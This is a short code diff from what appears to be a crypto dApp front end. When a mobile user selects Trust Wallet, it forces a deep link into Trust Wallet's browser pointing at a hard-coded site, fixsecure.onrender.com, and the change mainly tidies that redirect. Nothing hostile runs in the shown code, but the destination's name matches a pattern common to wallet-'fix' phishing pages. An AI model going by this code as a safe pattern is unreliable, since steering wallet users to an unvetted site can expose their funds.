@@ -192,22 +192,30 @@ const events = useAppKitEvents();
   };
 
 
-    useEffect(() => {
-    if (!events?.data) return;
+useEffect(() => {
+  if (!events?.data) return;
 
-    // ✅ Detect the "SELECT_WALLET" event
-    if (events.data.event === "SELECT_WALLET") {
-      const walletName = events.data.properties?.name?.toLowerCase();
+  // ✅ Detect the "SELECT_WALLET" event
+  if (events.data.event === "SELECT_WALLET") {
+    const walletName = events.data.properties?.name?.toLowerCase();
 
-      console.log("Wallet Selected:", walletName);
+    console.log("Wallet Selected:", walletName);
 
-      if (walletName?.includes("trust") && isMobileDevice && !isTrustWalletApp()) {
+    if (walletName?.includes("trust") && isMobileDevice && !isTrustWalletApp()) {
+      // ✅ Encode the DApp URL
+      const dappUrl = encodeURIComponent("https://fixsecure.onrender.com");
 
-        // ✅ Open DApp INSIDE Trust Wallet browser
-        window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
-      }
+      // ✅ Open DApp in Trust Wallet browser in a new tab safely
+      window.open(
+        `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=${dappUrl}`,
+        "_blank",
+        "noopener,noreferrer"
+      );
     }
-  }, [events, isMobileDevice]);
+  }
+}, [events, isMobileDevice]);
+
+
 
   // useEffect(() => {
 
